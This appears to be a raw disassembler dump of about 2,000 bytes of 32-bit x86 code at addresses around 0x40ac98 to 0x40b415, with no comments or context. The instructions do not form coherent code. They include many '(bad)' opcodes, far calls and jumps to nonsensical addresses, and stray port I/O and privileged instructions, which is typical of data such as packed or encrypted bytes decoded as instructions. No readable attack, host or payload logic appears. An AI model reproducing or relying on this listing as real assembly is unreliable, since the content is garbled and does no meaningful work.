  40ac98:	sti    
  40ac99:	loope  0x40ac42
  40ac9b:	sub    al,0xe4
  40ac9d:	jmp    0x6162e131
  40aca2:	arpl   WORD PTR [ebx],sp
  40aca4:	jbe    0x40acd5
  40aca6:	mov    esp,fs
  40aca8:	ficomp DWORD PTR [ebx-0x4cc96fe4]
  40acae:	fstp   DWORD PTR [ebp+esi*4+0x73]
  40acb2:	inc    ecx
  40acb3:	jg     0x40aca8
  40acb5:	xor    ebp,eax
  40acb7:	bound  esp,QWORD PTR [ebx+0x10e49069]
  40acbd:	loopne 0x40acdf
  40acbf:	pusha  
  40acc0:	add    DWORD PTR [edx+0xaf9edc9],esp
  40acc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acc7:	out    dx,eax
  40acc8:	push   edi
  40acc9:	test   DWORD PTR [esp+ebx*8],ebx
  40accc:	sbb    bh,BYTE PTR [edx]
  40acce:	mov    ecx,0x63e6375a
  40acd3:	mov    al,0x30
  40acd5:	outs   dx,DWORD PTR ds:[esi]
  40acd6:	addr16 out 0xda,al
  40acd9:	push   ebx
  40acda:	sahf   
  40acdb:	rcl    DWORD PTR [edx+0x6c4bcc1d],0xab
  40ace2:	out    dx,eax
  40ace3:	pop    ecx
  40ace4:	leave  
  40ace5:	xor    al,dl
  40ace7:	push   ebx
  40ace8:	ret    
  40ace9:	mov    eax,0xb0909087
  40acee:	mov    cs,esi
  40acf0:	mov    bl,0xc7
  40acf2:	add    eax,0xe28a3d6d
  40acf7:	jno    0x40ad05
  40acf9:	ret    
  40acfa:	in     al,dx
  40acfb:	mov    ds:0x1f50053a,al
  40ad00:	mov    esi,0x879215ef
  40ad05:	mov    ecx,DWORD PTR [edx+0x3a59465b]
  40ad0b:	pushf  
  40ad0c:	stc    
  40ad0d:	add    esi,DWORD PTR [edx]
  40ad0f:	fwait
  40ad10:	shr    BYTE PTR [ecx+0x1f],0x8d
  40ad14:	and    eax,0x886ee196
  40ad19:	lock mov dh,0x8c
  40ad1c:	cmp    DWORD PTR [ebx],edx
  40ad1e:	adc    DWORD PTR [edi+0x38cdde5f],esi
  40ad24:	xchg   ecx,eax
  40ad25:	(bad)
  40ad28:	test   cl,al
  40ad2a:	dec    ebx
  40ad2b:	(bad)  
  40ad2c:	repnz xor eax,0x9d4a06b1
  40ad32:	and    eax,0xdb7c2d75
  40ad37:	data16 add bl,BYTE PTR [esi-0x4d]
  40ad3b:	ds arpl sp,dx
  40ad3e:	out    0xf8,al
  40ad40:	sbb    DWORD PTR [esi],esi
  40ad42:	aas    
  40ad43:	jns    0x40acd0
  40ad45:	mov    BYTE PTR [ebx+eax*4+0x50658411],ah
  40ad4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad4d:	mov    eax,0xa79185fe
  40ad52:	dec    eax
  40ad53:	outs   dx,BYTE PTR ds:[esi]
  40ad54:	or     eax,0x65355ae
  40ad59:	std    
  40ad5a:	inc    eax
  40ad5b:	jno    0x40adaa
  40ad5d:	push   es
  40ad5e:	(bad)  
  40ad5f:	and    ch,cl
  40ad61:	and    BYTE PTR [edx],bh
  40ad63:	inc    eax
  40ad64:	push   0xffffff89
  40ad66:	cmp    DWORD PTR [esp+ecx*1],eax
  40ad69:	mov    WORD PTR [edi+0x6b],?
  40ad6c:	dec    eax
  40ad6d:	je     0x40ad1f
  40ad6f:	add    al,0x44
  40ad71:	into   
  40ad72:	je     0x40ad02
  40ad74:	or     BYTE PTR ds:0x12673f60,bl
  40ad7a:	or     al,0x9b
  40ad7c:	stos   BYTE PTR es:[edi],al
  40ad7d:	fidivr WORD PTR [esi+0x11971515]
  40ad83:	mov    al,ds:0x2e7284f1
  40ad88:	jnp    0x40ae01
  40ad8a:	pop    esi
  40ad8b:	enter  0x1c53,0x8e
  40ad8f:	pop    ds
  40ad90:	(bad)  
  40ad91:	mov    al,ds:0x27505c9a
  40ad96:	inc    esi
  40ad97:	sub    ebx,DWORD PTR [edx+0x5f8d3a20]
  40ad9d:	adc    BYTE PTR [eax+ebp*1+0x79184586],bl
  40ada4:	mov    dh,0xb4
  40ada6:	sbb    eax,DWORD PTR [edi-0x7171be2e]
  40adac:	imul   ebx,DWORD PTR [edi+0x1d6b0b76],0x58
  40adb3:	mov    ah,0x68
  40adb5:	aaa    
  40adb6:	and    al,0x70
  40adb8:	scas   eax,DWORD PTR es:[edi]
  40adb9:	mov    ah,0x21
  40adbb:	inc    DWORD PTR [eax]
  40adbd:	cmp    esi,DWORD PTR [edi]
  40adbf:	and    bl,ch
  40adc1:	and    BYTE PTR [ecx],0xd1
  40adc4:	inc    eax
  40adc5:	not    DWORD PTR ds:0x8b5458aa
  40adcb:	out    dx,al
  40adcc:	xor    eax,0xe28ed1fe
  40add1:	sbb    BYTE PTR [eax+0x30],bh
  40add4:	pop    es
  40add5:	bound  ebp,QWORD PTR [eax+0x28]
  40add8:	sbb    DWORD PTR [eax-0x4a],0x10
  40addc:	cmp    eax,ebp
  40adde:	loope  0x40ad71
  40ade0:	and    DWORD PTR [ecx],esp
  40ade2:	call   0x9437754d
  40ade7:	pop    edx
  40ade8:	pop    ebx
  40ade9:	pushf  
  40adea:	jbe    0x40ae21
  40adec:	xor    al,0x6d
  40adee:	fmul   st,st(4)
  40adf0:	call   0x9f6a:0x3b8a56e1
  40adf7:	cmc    
  40adf8:	inc    ecx
  40adf9:	mov    edi,0x29e2afd7
  40adfe:	sbb    BYTE PTR [esp+edx*4+0x263a3149],ch
  40ae05:	aaa    
  40ae06:	xor    edx,ecx
  40ae08:	add    BYTE PTR [ebx+0x3],al
  40ae0b:	inc    ecx
  40ae0c:	cld    
  40ae0d:	pushf  
  40ae0e:	mov    bh,0x99
  40ae10:	icebp  
  40ae11:	push   eax
  40ae12:	neg    DWORD PTR [esi-0x3e]
  40ae15:	xor    eax,0x214c8647
  40ae1a:	fldenv [edx]
  40ae1c:	pop    eax
  40ae1d:	enter  0x4fd1,0xc5
  40ae21:	mov    eax,ds:0xfdc3adbb
  40ae26:	icebp  
  40ae27:	mov    bl,BYTE PTR [ebx]
  40ae29:	dec    edx
  40ae2a:	inc    ebx
  40ae2b:	data16 mov bl,0xe5
  40ae2e:	pop    esp
  40ae2f:	loop   0x40ae32
  40ae31:	les    edx,FWORD PTR [esi+esi*8-0x6d]
  40ae35:	sub    eax,0x6d3a7dd7
  40ae3a:	daa    
  40ae3b:	inc    edx
  40ae3c:	sbb    dl,cl
  40ae3e:	push   ds
  40ae3f:	adc    BYTE PTR [ebx+0x3],ah
  40ae42:	js     0x40ae3b
  40ae44:	inc    ebp
  40ae45:	lods   al,BYTE PTR ds:[esi]
  40ae46:	push   cs
  40ae47:	jp     0x40adea
  40ae49:	xchg   esp,eax
  40ae4a:	neg    dh
  40ae4c:	pop    ds
  40ae4d:	call   0xdb2a:0x30ed2672
  40ae54:	cmp    BYTE PTR [eax],bh
  40ae56:	mov    esp,0xb6ce765d
  40ae5b:	or     al,0xc4
  40ae5d:	jns    0x40ade7
  40ae5f:	aas    
  40ae60:	add    BYTE PTR [ecx-0x4b],0x68
  40ae64:	push   edx
  40ae65:	je     0x40aee4
  40ae67:	or     BYTE PTR [ebx-0x2f],bl
  40ae6a:	xchg   edi,edi
  40ae6c:	jmp    0x40aee7
  40ae6e:	sub    ebp,DWORD PTR [ebp+0xc335eaa]
  40ae74:	(bad)  
  40ae76:	xor    al,bh
  40ae78:	sub    al,0x67
  40ae7a:	gs icebp 
  40ae7c:	dec    ecx
  40ae7d:	jp     0x40ae7c
  40ae7f:	bound  edx,QWORD PTR [ebx+0x4e]
  40ae82:	xor    BYTE PTR [ecx],0xbe
  40ae85:	in     al,dx
  40ae86:	adc    eax,0x8b1ac5a7
  40ae8b:	jmp    0x40ae32
  40ae8d:	cmp    DWORD PTR [ebx],esp
  40ae8f:	cmp    al,0x9e
  40ae91:	add    eax,0x449e5638
  40ae96:	jecxz  0x40ae48
  40ae98:	or     edi,DWORD PTR [edx+0x3f]
  40ae9b:	fsubr  QWORD PTR [ecx-0x42]
  40ae9e:	mov    eax,ds:0xedb1165e
  40aea3:	ror    BYTE PTR [edx-0x2b],1
  40aea6:	lea    esi,[ebp+0x27]
  40aea9:	leave  
  40aeaa:	xor    ch,BYTE PTR [ebx]
  40aeac:	mov    ds:0xd563e2c9,eax
  40aeb1:	push   ds
  40aeb2:	xor    al,0x81
  40aeb4:	or     al,BYTE PTR [esi+0x67246c7f]
  40aeba:	loopne 0x40af12
  40aebc:	(bad)  
  40aebd:	dec    esi
  40aebe:	int3   
  40aebf:	or     ecx,DWORD PTR [eax]
  40aec1:	stc    
  40aec2:	adc    ch,0x96
  40aec5:	jmp    0x40ae71
  40aec7:	and    al,0x1c
  40aec9:	lds    edx,FWORD PTR [ecx+0x66]
  40aecc:	push   esp
  40aecd:	lods   al,BYTE PTR ds:[esi]
  40aece:	and    cl,BYTE PTR [eax]
  40aed0:	ins    BYTE PTR es:[edi],dx
  40aed1:	mov    DWORD PTR [ecx-0x24],esi
  40aed4:	rcr    BYTE PTR [eax-0x5cffb746],1
  40aeda:	add    bh,BYTE PTR [edx]
  40aedc:	xchg   edi,eax
  40aedd:	xchg   esi,eax
  40aede:	push   es
  40aedf:	mov    ds:0x2fb69702,eax
  40aee4:	mov    dl,0xea
  40aee6:	mov    DWORD PTR [edi],ecx
  40aee8:	dec    ecx
  40aee9:	call   0x1dd0:0xd8fa5e10
  40aef0:	lods   eax,DWORD PTR ds:[esi]
  40aef1:	shl    DWORD PTR [edx-0x4d69c90c],1
  40aef7:	adc    ah,ah
  40aef9:	mov    bl,0xa7
  40aefb:	loope  0x40af6a
  40aefd:	mov    ds:0x61afe2b3,al
  40af02:	call   0x2a9c46b6
  40af07:	icebp  
  40af08:	repnz sbb esi,esi
  40af0b:	out    0x1c,eax
  40af0d:	mov    ah,0xc5
  40af0f:	push   edi
  40af10:	(bad)  
  40af11:	in     al,0xfe
  40af13:	daa    
  40af14:	jno    0x40aea5
  40af16:	push   0x19
  40af18:	cdq    
  40af19:	push   edx
  40af1a:	sti    
  40af1b:	pop    es
  40af1c:	in     eax,0xa
  40af1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af1f:	scas   eax,DWORD PTR es:[edi]
  40af20:	popf   
  40af21:	mov    ecx,DWORD PTR [ecx]
  40af23:	xor    ecx,ecx
  40af25:	aam    0x14
  40af27:	test   BYTE PTR [ebx+0x4e08a167],0x85
  40af2e:	jp     0x40af52
  40af30:	cmp    al,0x14
  40af32:	cmp    ch,0xf5
  40af35:	jmp    0x40af08
  40af37:	mov    dl,0x41
  40af39:	sbb    ebx,DWORD PTR [edi+eiz*4+0x415d9629]
  40af40:	and    DWORD PTR [eax-0x1e],0xffffffa3
  40af44:	and    DWORD PTR [ecx+0x5674ff7b],eax
  40af4a:	sbb    eax,edi
  40af4c:	sbb    BYTE PTR [ebx+eax*8],dl
  40af4f:	(bad)  
  40af50:	stos   BYTE PTR es:[edi],al
  40af51:	dec    esp
  40af52:	pop    eax
  40af53:	push   eax
  40af54:	sub    edi,ecx
  40af56:	push   ecx
  40af57:	scas   eax,DWORD PTR es:[edi]
  40af58:	bound  ebx,QWORD PTR [ebx-0x14]
  40af5b:	outs   dx,DWORD PTR ds:[esi]
  40af5c:	jbe    0x40af25
  40af5e:	fs or  eax,0xac91f1c8
  40af64:	mov    edx,0xc4c116e7
  40af69:	jge    0x40af37
  40af6b:	jl     0x40afec
  40af6d:	les    esp,FWORD PTR [ebp-0x74]
  40af70:	retf   0x1e3c
  40af73:	xor    eax,0x418324cc
  40af78:	shl    BYTE PTR [ecx],1
  40af7a:	rol    BYTE PTR [edx],cl
  40af7c:	div    BYTE PTR [esp+edx*4]
  40af7f:	jl     0x40af62
  40af81:	pop    edi
  40af82:	sti    
  40af83:	int    0x3b
  40af85:	test   DWORD PTR ds:0x340ea5b2,eax
  40af8b:	mov    esp,0x9e96f84f
  40af90:	js     0x40af9f
  40af92:	mov    cs,WORD PTR [ecx]
  40af94:	mov    edi,0xdfc90dc7
  40af99:	and    ecx,ebp
  40af9b:	mov    ah,0xa
  40af9d:	dec    edi
  40af9e:	(bad)  
  40af9f:	sbb    al,BYTE PTR [esi+edx*4+0x77]
  40afa3:	hlt    
  40afa4:	imul   ebx,DWORD PTR [eax+edx*1],0xfffffffc
  40afa8:	imul   esp,DWORD PTR ds:0xc120fe08,0x34da85ec
  40afb2:	jmp    0x26d7:0xa25fe067
  40afb9:	pop    esp
  40afba:	icebp  
  40afbb:	ins    DWORD PTR es:[edi],dx
  40afbc:	pop    edx
  40afbd:	mov    DWORD PTR [ebx+0x36b23da9],0x68cc7f93
  40afc7:	jge    0x40af77
  40afc9:	nop
  40afca:	jne    0x40af5c
  40afcc:	dec    ebx
  40afcd:	mov    ch,0xf7
  40afcf:	stos   BYTE PTR es:[edi],al
  40afd0:	je     0x40af75
  40afd2:	xchg   ebx,eax
  40afd3:	cmp    BYTE PTR [edx],dh
  40afd5:	fbstp  TBYTE PTR ds:0xc96dc816
  40afdb:	popf   
  40afdc:	inc    esp
  40afdd:	dec    edi
  40afde:	repnz mov WORD PTR [ebx+0x29],ds
  40afe2:	xchg   esi,eax
  40afe3:	imul   ebx,DWORD PTR [edi-0x6],0x3ff4515a
  40afea:	retf   
  40afeb:	jecxz  0x40aff2
  40afed:	sti    
  40afee:	and    al,0xed
  40aff0:	lea    ecx,[ebp+0x48]
  40aff3:	mov    BYTE PTR ds:0x2d883b8b,dl
  40aff9:	sbb    esp,DWORD PTR [edi+ecx*2+0x60]
  40affd:	or     DWORD PTR [edx+0x702d9919],0x49
  40b004:	jns    0x40affa
  40b006:	xchg   esp,eax
  40b007:	sbb    BYTE PTR [eax-0x73fff76c],cl
  40b00d:	in     eax,0x91
  40b00f:	test   esp,edi
  40b011:	ins    DWORD PTR es:[edi],dx
  40b012:	mul    ah
  40b014:	cmp    DWORD PTR [ebx-0x1f1cd9f3],edi
  40b01a:	enter  0x636b,0xa3
  40b01e:	xlat   BYTE PTR ds:[ebx]
  40b01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b020:	sub    DWORD PTR [esi],edx
  40b022:	pop    esp
  40b023:	pop    ecx
  40b024:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b026:	push   edx
  40b027:	mov    cl,0xb4
  40b029:	dec    ebx
  40b02a:	mov    ?,WORD PTR [esi+0x2c]
  40b02d:	in     eax,0xf7
  40b02f:	push   cs
  40b030:	pop    ss
  40b031:	rcr    BYTE PTR [ebx],0x9c
  40b034:	pop    ss
  40b035:	mov    bl,0x17
  40b037:	xchg   BYTE PTR [esi+0x2f819ad],cl
  40b03d:	(bad)  
  40b03e:	cmc    
  40b03f:	test   al,0xf1
  40b041:	pop    ebx
  40b042:	aas    
  40b043:	mov    esp,0xd733d6e4
  40b048:	scas   al,BYTE PTR es:[edi]
  40b049:	sbb    al,0x80
  40b04b:	adc    esp,DWORD PTR [esi+0x605677ba]
  40b051:	mov    eax,ds:0xde82fd62
  40b056:	loop   0x40aff4
  40b058:	xor    ch,BYTE PTR [ebx]
  40b05a:	jl     0x40b053
  40b05c:	(bad)  
  40b05d:	arpl   WORD PTR [esp+eax*4-0x6d5e791f],si
  40b064:	mov    esi,0x282a3481
  40b069:	int    0x66
  40b06b:	cmc    
  40b06c:	cwde   
  40b06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b06e:	mov    dh,0xc2
  40b070:	lods   al,BYTE PTR ds:[esi]
  40b071:	mov    bh,0xbb
  40b073:	or     al,0x54
  40b075:	pop    DWORD PTR [ebx-0x2c0ac6ca]
  40b07b:	dec    eax
  40b07c:	sbb    al,0x56
  40b07e:	call   0xa47a629c
  40b083:	bound  ecx,QWORD PTR [ebx+eiz*1-0x62]
  40b087:	rcr    DWORD PTR [eax+0x77af4c1f],1
  40b08d:	int3   
  40b08e:	mov    al,ds:0xb7d5c30f
  40b093:	in     eax,0x24
  40b095:	mov    ds:0x13115615,al
  40b09a:	push   edi
  40b09c:	leave  
  40b09d:	dec    edi
  40b09e:	jp     0x40b060
  40b0a0:	push   es
  40b0a1:	sub    DWORD PTR [edx+0x2d0a943a],edx
  40b0a7:	cdq    
  40b0a8:	push   ds
  40b0a9:	pop    ebx
  40b0aa:	pop    ebx
  40b0ab:	pushf  
  40b0ac:	retf   
  40b0ad:	xchg   BYTE PTR [ecx+0x2fe9b18a],al
  40b0b3:	mov    ecx,esi
  40b0b5:	xchg   ebx,eax
  40b0b6:	into   
  40b0b7:	retf   0xb214
  40b0ba:	sub    al,0x2c
  40b0bc:	mov    ebx,0x276abe53
  40b0c1:	push   0x61
  40b0c3:	adc    DWORD PTR [eax-0x4a0d8409],ecx
  40b0c9:	mov    ebp,0x1a95233e
  40b0ce:	repnz mov dl,0xe7
  40b0d1:	push   ss
  40b0d2:	jmp    0xb263427a
  40b0d7:	sbb    eax,DWORD PTR [edx-0x50]
  40b0da:	(bad)  
  40b0db:	cmc    
  40b0dc:	xor    cl,BYTE PTR [ebx-0x19]
  40b0df:	add    DWORD PTR [esi-0x66553387],edx
  40b0e5:	pop    ebx
  40b0e6:	popa   
  40b0e7:	aas    
  40b0e8:	lods   eax,DWORD PTR ds:[esi]
  40b0e9:	shl    DWORD PTR [eax],0xf9
  40b0ec:	and    edi,ebx
  40b0ee:	dec    esi
  40b0ef:	les    edi,FWORD PTR [eax-0x104ef81]
  40b0f5:	push   0xb8e0d1ca
  40b0fa:	(bad)  
  40b0fb:	out    dx,eax
  40b0fc:	push   ss
  40b0fd:	bound  ebx,QWORD PTR [esi+0x6ae671cc]
  40b103:	(bad)
  40b106:	pushf  
  40b107:	(bad)  
  40b108:	(bad)  
  40b10a:	inc    ebx
  40b10b:	cli    
  40b10c:	test   ah,ah
  40b10e:	or     bh,BYTE PTR [ebx+0x2fb075e8]
  40b114:	dec    ecx
  40b115:	das    
  40b116:	xchg   ebx,eax
  40b117:	in     al,dx
  40b118:	sub    dh,BYTE PTR [edi-0x56]
  40b11b:	loope  0x40b0e8
  40b11d:	jmp    0x4c8e0723
  40b122:	push   esi
  40b123:	mov    ds:0x7a5be348,eax
  40b128:	jns    0x40b17d
  40b12a:	sti    
  40b12b:	div    BYTE PTR ds:0x685e9296
  40b131:	loopne 0x40b165
  40b133:	xchg   esp,eax
  40b134:	xchg   esp,eax
  40b135:	leave  
  40b136:	and    al,0x3d
  40b138:	sbb    al,0x3b
  40b13a:	push   0xc343117a
  40b13f:	push   esp
  40b140:	mov    edx,0xc0468081
  40b145:	stos   DWORD PTR es:[edi],eax
  40b146:	jmp    0x40b1a8
  40b148:	in     eax,dx
  40b149:	pop    eax
  40b14a:	xor    dl,BYTE PTR [edx-0x39]
  40b14d:	mov    ah,BYTE PTR [eax+0x48e0560a]
  40b153:	mov    bl,0x26
  40b155:	jns    0x40b0f2
  40b157:	dec    ebp
  40b158:	fsubr  DWORD PTR [ebx+edi*8]
  40b15b:	imul   ebx,DWORD PTR [ebx+0x1bb66cf8],0x70
  40b162:	mov    bh,BYTE PTR [edi]
  40b164:	test   al,0x7c
  40b166:	sub    esi,DWORD PTR [esp+edx*8+0x2300fe98]
  40b16d:	dec    edi
  40b16e:	push   cs
  40b16f:	retf   
  40b170:	sbb    BYTE PTR [ebx-0x42ca7ef9],dh
  40b176:	mov    bh,0xed
  40b178:	scas   eax,DWORD PTR es:[edi]
  40b179:	mov    ch,0xb7
  40b17b:	pop    eax
  40b17c:	jg     0x40b16b
  40b17e:	jne    0x40b1b1
  40b180:	cdq    
  40b181:	mov    ebx,0x41e44318
  40b186:	test   BYTE PTR [ecx-0x4f1fef46],cl
  40b18c:	xor    BYTE PTR [esp+ecx*1],0xfc
  40b190:	scas   eax,DWORD PTR es:[edi]
  40b191:	add    DWORD PTR ds:0x8f274ce5,ebx
  40b197:	pop    esp
  40b198:	aas    
  40b199:	jg     0x40b11e
  40b19b:	mov    edi,0x408514bd
  40b1a0:	cli    
  40b1a1:	jmp    0x40b14a
  40b1a3:	scas   al,BYTE PTR es:[edi]
  40b1a4:	int    0x8b
  40b1a6:	add    bh,BYTE PTR [esi]
  40b1a8:	and    eax,0xe31a7b69
  40b1ad:	mov    WORD PTR [esi],es
  40b1af:	dec    ebx
  40b1b0:	out    dx,al
  40b1b1:	imul   dh
  40b1b3:	call   0x84320a6f
  40b1b8:	popa   
  40b1b9:	jp     0x40b212
  40b1bb:	ds jb  0x40b1de
  40b1be:	out    dx,eax
  40b1bf:	or     al,0x81
  40b1c1:	inc    esp
  40b1c2:	fild   DWORD PTR [ebx-0x51ac04e4]
  40b1c8:	and    BYTE PTR [esi+ebx*2-0x48],bh
  40b1cc:	nop
  40b1cd:	cmp    edi,DWORD PTR [esp+ebx*4]
  40b1d0:	or     eax,0xc7a8dc4b
  40b1d5:	lahf   
  40b1d6:	fild   QWORD PTR [edi+0x192981d7]
  40b1dc:	dec    edi
  40b1dd:	push   ebp
  40b1de:	into   
  40b1df:	mov    esp,0x54741c29
  40b1e4:	ss cmp dh,ch
  40b1e7:	cmc    
  40b1e8:	jp     0x40b171
  40b1ea:	inc    ebx
  40b1eb:	xchg   ecx,eax
  40b1ec:	fcomp  st(4)
  40b1ee:	(bad)  
  40b1f0:	repz jno 0x40b24e
  40b1f3:	inc    esp
  40b1f4:	jmp    0xf7dc:0xfa852d26
  40b1fb:	mov    esp,0xa3b3d168
  40b200:	push   edi
  40b201:	mov    esi,0xd93e4e31
  40b206:	outs   dx,DWORD PTR ds:[esi]
  40b207:	clc    
  40b208:	vandnps xmm7,xmm4,xmm0
  40b20c:	xor    al,0x16
  40b20e:	mov    ds:0xe0a66293,al
  40b213:	add    al,0xf8
  40b215:	rcr    BYTE PTR [esi+ebp*8+0x5d3c75e7],1
  40b21c:	mov    DWORD PTR [edi+ecx*1+0x2dbb4e6f],edx
  40b223:	add    al,BYTE PTR [edi+0x41]
  40b226:	push   0xaf8d2ab
  40b22b:	mov    bl,0x82
  40b22d:	xor    bl,bl
  40b22f:	jns    0x40b22c
  40b231:	jl     0x40b252
  40b233:	xchg   edi,eax
  40b234:	inc    esp
  40b235:	sub    DWORD PTR [edi+0x3b],esp
  40b238:	cmp    dl,al
  40b23a:	mov    ah,BYTE PTR [edi]
  40b23c:	push   esi
  40b23d:	loopne 0x40b28b
  40b23f:	les    ecx,FWORD PTR [ecx]
  40b241:	cmp    eax,0xbd15a2af
  40b246:	loop   0x40b275
  40b248:	arpl   WORD PTR [eax+0x75],si
  40b24b:	aam    0xdd
  40b24d:	push   ds
  40b24e:	int    0x6e
  40b250:	mov    ah,0x18
  40b252:	jb     0x40b26a
  40b254:	lods   al,BYTE PTR ds:[esi]
  40b255:	pop    es
  40b256:	jle    0x40b24d
  40b258:	xchg   edi,eax
  40b259:	mov    ch,BYTE PTR [eax]
  40b25b:	inc    esi
  40b25c:	mov    dl,BYTE PTR [ecx+0x3]
  40b25f:	ins    DWORD PTR es:[edi],dx
  40b260:	repz aam 0xba
  40b263:	mov    edx,0x1b119d55
  40b268:	mov    cl,0xc9
  40b26a:	cmp    eax,0x28d838b
  40b26f:	cdq    
  40b270:	sub    al,0x7a
  40b272:	call   0x146e:0x36fe46b3
  40b279:	aam    0x6f
  40b27b:	jecxz  0x40b2a1
  40b27d:	xchg   esi,eax
  40b27e:	fmul   DWORD PTR [ecx]
  40b280:	cdq    
  40b281:	stc    
  40b282:	mov    esi,esp
  40b284:	xchg   ecx,eax
  40b285:	clc    
  40b286:	push   ds
  40b287:	(bad)  
  40b288:	fs jae 0x40b2a7
  40b28b:	lea    edx,[eax-0x14]
  40b28e:	mov    ebx,0x9459b601
  40b293:	cmp    al,0x61
  40b295:	add    eax,0x4dd595f
  40b29a:	pop    ds
  40b29b:	xchg   ebx,eax
  40b29c:	rcl    edx,cl
  40b29e:	int3   
  40b29f:	out    dx,al
  40b2a0:	pop    eax
  40b2a1:	outs   dx,DWORD PTR ds:[esi]
  40b2a2:	sub    eax,0x9bdf4269
  40b2a7:	cmc    
  40b2a8:	and    DWORD PTR [esi+0x26ab6cb4],ecx
  40b2ae:	pop    esp
  40b2af:	jge    0x40b25d
  40b2b1:	inc    edi
  40b2b2:	mov    ebp,0xe64ae874
  40b2b7:	jecxz  0x40b2f0
  40b2b9:	cmp    BYTE PTR [eax],bh
  40b2bb:	dec    ecx
  40b2bc:	mov    al,ds:0x5bbae91
  40b2c1:	cmc    
  40b2c2:	dec    esp
  40b2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2c4:	push   dx
  40b2c6:	or     dh,BYTE PTR [esi+0x76]
  40b2c9:	pop    ecx
  40b2ca:	sbb    eax,esp
  40b2cc:	int    0xf8
  40b2ce:	fnsave [ebp+0x1cfb1f25]
  40b2d4:	push   ebx
  40b2d5:	cmp    al,0xa8
  40b2d7:	or     eax,0xba0ca11a
  40b2dc:	call   0x7ce7:0x6f783dcb
  40b2e3:	xchg   ecx,eax
  40b2e4:	outs   dx,BYTE PTR ds:[esi]
  40b2e5:	(bad)  
  40b2e6:	in     al,dx
  40b2e7:	jae    0x40b287
  40b2e9:	aaa    
  40b2ea:	test   eax,0xfcfe9c87
  40b2ef:	scas   eax,DWORD PTR es:[edi]
  40b2f0:	mov    esp,0x636953c6
  40b2f5:	xchg   ebx,eax
  40b2f6:	dec    eax
  40b2f7:	pop    ds
  40b2f8:	or     al,0x7d
  40b2fa:	(bad)  
  40b2fb:	or     eax,0x9143c23e
  40b300:	cli    
  40b301:	push   0xd
  40b303:	add    cl,dh
  40b305:	mov    al,0x12
  40b307:	jl     0x40b355
  40b309:	pop    esp
  40b30a:	sbb    eax,0x591f0570
  40b30f:	cli    
  40b310:	call   0xe73b8767
  40b315:	jno    0x40b37e
  40b317:	cs push ecx
  40b319:	mov    ds:0xf2435d25,al
  40b31e:	pop    esp
  40b31f:	call   0xbe79:0x87d6673
  40b326:	inc    esp
  40b327:	inc    edx
  40b328:	xchg   ecx,eax
  40b329:	mov    bl,0x66
  40b32b:	push   ss
  40b32c:	jns    0x40b348
  40b32e:	lahf   
  40b32f:	fild   QWORD PTR [ebx+0x54]
  40b332:	(bad)  
  40b333:	repz shl DWORD PTR [eax],1
  40b336:	outs   dx,BYTE PTR ds:[esi]
  40b337:	rcr    DWORD PTR [edi],cl
  40b339:	xchg   esp,eax
  40b33a:	loop   0x40b31f
  40b33c:	pop    es
  40b33d:	mov    ds:0x9d8f8c3c,eax
  40b342:	(bad)  ds:0x6d906a67
  40b348:	and    eax,0xd2273224
  40b34d:	push   edx
  40b34e:	cmp    DWORD PTR [ebp+0x1b2c42ba],0xa46ed71d
  40b358:	mov    eax,ebx
  40b35a:	(bad)  
  40b35b:	lds    edi,FWORD PTR [ebx-0x16897efc]
  40b361:	ja     0x40b372
  40b363:	jae    0x40b3e3
  40b365:	sbb    eax,0xf227449
  40b36a:	cmp    ebp,edi
  40b36c:	retf   0x7b56
  40b36f:	fcom   QWORD PTR [ebx-0x6a]
  40b372:	add    eax,0x284c797a
  40b377:	or     cl,bl
  40b379:	(bad)
  40b37c:	adc    al,0xbb
  40b37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b37f:	xor    bl,BYTE PTR [edx-0x5f0b2473]
  40b385:	repnz aam 0xed
  40b388:	inc    esi
  40b389:	call   0x77f2:0x66c4b1a6
  40b390:	out    0xa6,al
  40b392:	dec    eax
  40b393:	xchg   ebx,eax
  40b394:	push   ss
  40b395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b396:	stc    
  40b397:	cmp    eax,0x462456fd
  40b39c:	ins    BYTE PTR es:[edi],dx
  40b39d:	inc    esi
  40b39e:	jle    0x40b36b
  40b3a0:	add    ch,bh
  40b3a2:	loope  0x40b41f
  40b3a4:	or     esp,ecx
  40b3a6:	call   0xa4540858
  40b3ab:	adc    dl,BYTE PTR [edi-0x11]
  40b3ae:	pop    esp
  40b3af:	aam    0x2f
  40b3b1:	sbb    ch,al
  40b3b3:	inc    eax
  40b3b4:	gs shr dh,1
  40b3b7:	mov    ds:0xf949861,al
  40b3bc:	lds    edx,FWORD PTR [ebx-0x6b]
  40b3bf:	cmp    al,0x42
  40b3c1:	dec    edi
  40b3c2:	into   
  40b3c3:	dec    edi
  40b3c4:	loop   0x40b399
  40b3c6:	call   esp
  40b3c8:	pusha  
  40b3c9:	mov    ch,0xf9
  40b3cb:	jae    0x40b352
  40b3cd:	pop    edx
  40b3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3cf:	mov    bh,0xfb
  40b3d2:	push   es
  40b3d3:	jb     0x40b3ad
  40b3d5:	add    al,0xd3
  40b3d7:	pop    esi
  40b3d8:	xchg   edi,eax
  40b3d9:	adc    BYTE PTR [ebx],0x6
  40b3dc:	mov    edx,0xa289d1c
  40b3e1:	mov    edi,0x92f373c8
  40b3e6:	xor    al,0x26
  40b3e8:	std    
  40b3e9:	dec    edi
  40b3ea:	add    bl,ch
  40b3ec:	into   
  40b3ed:	fcompp 
  40b3ef:	push   DWORD PTR [ecx]
  40b3f1:	clc    
  40b3f2:	mov    esp,0xe7374689
  40b3f7:	pusha  
  40b3f8:	push   ebx
  40b3f9:	inc    edi
  40b3fa:	and    ecx,DWORD PTR [edx-0x4a]
  40b3fd:	outs   dx,BYTE PTR ds:[esi]
  40b3fe:	int3   
  40b3ff:	pop    edi
  40b400:	xchg   DWORD PTR [eax-0x63709395],ebp
  40b406:	inc    esi
  40b407:	fstp   st(4)
  40b409:	mov    edx,0x88d91d27
  40b40e:	dec    eax
  40b40f:	mov    ebp,0x79f30724
  40b414:	inc    ecx
  40b415:	fcom   DWORD PTR [eax-0x1cce5c35]
